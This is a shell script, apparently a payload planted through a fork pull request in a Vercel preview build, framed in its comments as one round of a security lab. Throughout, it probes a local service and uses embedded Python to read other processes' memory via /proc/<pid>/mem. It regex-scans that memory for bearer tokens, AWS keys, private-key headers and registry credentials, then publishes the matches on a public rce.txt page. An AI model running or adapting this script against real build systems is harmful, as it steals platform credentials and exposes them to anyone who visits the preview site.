#!/bin/sh
# Payload introduced ONLY by the fork PR. Round 11: fd theft works (pidfd_getfd =
# syscall 438), so untrusted build code can reach the platform agent's fds. Now test
# the stronger one: can build code read the platform processes' memory (/proc/<pid>/mem)
# and find credentials in it? Also probe the listener on 0.0.0.0:8090.
OUT=../../public
mkdir -p "$OUT"
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > "$OUT/index.html"
F="$OUT/rce.txt"
{
  echo "== what listens on 8090 =="
  curl -s -m 3 -i http://127.0.0.1:8090/ 2>&1 | head -12
  curl -s -m 3 -i http://127.0.0.1:8090/health 2>&1 | head -6
  echo
  echo "== can build code read the platform processes' memory? =="
  /uv/python/bin/python3 - <<'PYEOF' 2>&1
import re, os
PATS = [
    ("vercel-hdr", rb"x-vercel-[a-z\-]{3,25}:[ ]?[A-Za-z0-9._\-]{4,}"),
    ("bearer",     rb"[Bb]earer [A-Za-z0-9._\-]{12,}"),
    ("nv-token",   rb"nv_[A-Za-z0-9]{10,}"),
    ("datadog",    rb"(DD_API_KEY|datadog)[A-Za-z0-9_./:=\-]{0,40}"),
    ("npm-auth",   rb"(npmjs\.org|registry\.npm|NPM_PROXY_UPSTREAM)[A-Za-z0-9_./:=@\-]{0,60}"),
    ("aws",        rb"AKIA[0-9A-Z]{12,}"),
    ("pem",        rb"-----BEGIN [A-Z ]{0,20}-----"),
    ("host",       rb"(api|sfo|iad|fra)[a-z0-9.\-]*vercel\.com"),
    ("celld",      rb"/opt/vercel/[a-z0-9.\_/]{3,40}"),
    ("ipc",        rb"(vsock|celld|169\.254\.0\.1|virtio)[a-z0-9.:\_/]{0,30}"),
]
total = 0
for pid in (1, 12, 36):
    try:
        maps = open("/proc/%d/maps" % pid).read()
    except Exception as e:
        print("  pid %d maps: %r" % (pid, e)); continue
    cmd = open("/proc/%d/cmdline" % pid).read().replace("\0", " ")[:60]
    print("-- pid %d (%s)" % (pid, cmd))
    hits = {}
    scanned = 0
    try:
        f = open("/proc/%d/mem" % pid, "rb", 0)
    except Exception as e:
        print("   open /proc/pid/mem -> %r" % e); continue
    for line in maps.splitlines():
        parts = line.split()
        if len(parts) < 2: continue
        try:
            lo, hi = (int(x, 16) for x in parts[0].split("-"))
        except Exception: continue
        size = hi - lo
        if size <= 0 or size > 40 * 1024 * 1024: continue
        scanned += size
        if scanned > 180 * 1024 * 1024: break
        try:
            f.seek(lo); data = f.read(size)
        except Exception:
            continue
        if not data: continue
        for name, pat in PATS:
            for m in re.finditer(pat, data):
                s = m.group(0).decode("latin1", "replace")
                key = (name, s[:40])
                if key not in hits:
                    hits[key] = (lo + m.start(), s)
    print("   scanned %d MB; %d unique matches" % (scanned // 1048576, len(hits)))
    for (name, _), (addr, s) in list(hits.items())[:14]:
        shown = s if len(s) <= 60 else s[:57] + "..."
        print("   %-10s @%08x %s" % (name, addr, shown))
    total += len(hits)
print("== total unique matches: %d ==" % total)
PYEOF
} > "$F" 2>&1
sleep 2
cat "$F"
